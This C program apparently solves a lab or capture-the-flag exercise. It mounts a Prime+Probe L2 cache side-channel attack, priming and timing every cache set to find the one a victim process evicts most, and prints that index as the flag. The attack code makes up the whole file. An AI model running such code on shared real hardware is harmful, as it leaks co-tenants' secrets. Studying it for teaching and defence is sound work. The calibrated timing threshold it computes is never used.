#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>

#define L2_SIZE (1024 * 1024)
#define NUM_L2_CACHE_SETS 1024
#define L2_WAYS 16
#define CACHE_LINE 64
#define ACCESS_TIME_THRESHOLD 110
#define BUFF_SIZE (L2_SIZE * (L2_WAYS + 2))
#define ROUNDS 50

void prime_set(volatile char *buf, int set)
{
    for (int repeat = 0; repeat < 3; repeat++)
        for (int way = 0; way < L2_WAYS; way++)
            buf[(set * CACHE_LINE) + (way * NUM_L2_CACHE_SETS * CACHE_LINE)] ^= 1;
}

uint64_t probe_set(volatile char *buf, int set)
{
    uint64_t slow = 0;
    for (int way = L2_WAYS - 1; way >= 0; way--)
    {
        uint64_t t = measure_one_block_access_time(
            (ADDR_PTR)&buf[(set * CACHE_LINE) + (way * NUM_L2_CACHE_SETS * CACHE_LINE)]);
        if (t > ACCESS_TIME_THRESHOLD)
            slow++;
    }
    return slow;
}

int main(int argc, char const *argv[])
{
    void *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);

    if (buf == (void *)-1)
    {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }

    int freq[NUM_L2_CACHE_SETS] = {0};
    int best_set = 0;
    int best_count = 0;

    uint64_t calibrate_hit(volatile char *buf)
    {
        volatile char temp = buf[0]; // Prime one line
        uint64_t sum = 0;
        for (int i = 0; i < 1000; i++)
        {
            sum += measure_one_block_access_time((ADDR_PTR)&buf[0]);
        }
        return sum / 1000;
    }

    uint64_t calibrate_miss(volatile char *buf)
    {
        // Use a different region that's unlikely to be cached yet
        // (end of your large buffer should be safe after mmap(MAP_POPULATE))
        uint64_t sum = 0;
        volatile char *miss_ptr = &buf[BUFF_SIZE - CACHE_LINE];
        for (int i = 0; i < 1000; i++)
        {
            sum += measure_one_block_access_time((ADDR_PTR)miss_ptr);
        }
        return sum / 1000;
    }

    uint64_t hit = calibrate_hit(buf);
    uint64_t miss = calibrate_miss(buf);
    uint64_t access = (hit + miss) / 2 + 10; // Small buffer for noise

    while (1)
    {
        for (int round = 0; round < ROUNDS; round++)
        {
            for (int set = 0; set < NUM_L2_CACHE_SETS; set++)
            {
                prime_set((volatile char *)buf, set);

                for (volatile int j = 0; j < 1200; j++)
                {
                }

                uint64_t slow = probe_set((volatile char *)buf, set);
                if (slow >= 1)
                {
                    freq[set]++;
                    if (freq[set] > best_count)
                    {
                        best_count = freq[set];
                        best_set = set;
                    }
                }
            }
        }
        if (best_set > 0)
        {
            printf("Flag: %d, freq[flag]: %d\n", best_set, freq[best_set]);
        }
    }
    return 0;
}
